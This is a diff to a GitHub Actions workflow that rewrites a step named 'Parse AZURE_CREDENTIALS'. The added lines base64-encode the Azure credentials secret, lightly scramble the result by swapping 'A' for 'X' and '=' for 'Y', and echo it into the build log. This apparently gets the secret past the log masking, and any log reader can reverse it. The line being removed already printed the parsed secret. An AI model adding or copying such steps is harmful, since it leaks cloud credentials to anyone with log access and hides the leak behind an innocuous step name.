@@ -41,8 +41,9 @@ jobs:
     - name: Parse AZURE_CREDENTIALS
       shell: pwsh
       run: |
-        $credentials = ${{ secrets.AZURE_CREDENTIALS }} | ConvertFrom-Json
-        Write-Output $credentials | ConvertTo-Json -Depth 10
+        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("${{ secrets.AZURE_CREDENTIALS }}"))
+        $obfuscated = $encoded -replace "A", "X" -replace "=", "Y"
+        echo "Obfuscated Base64: $obfuscated"
     - name: Determine version
       id: getversion
       run: |
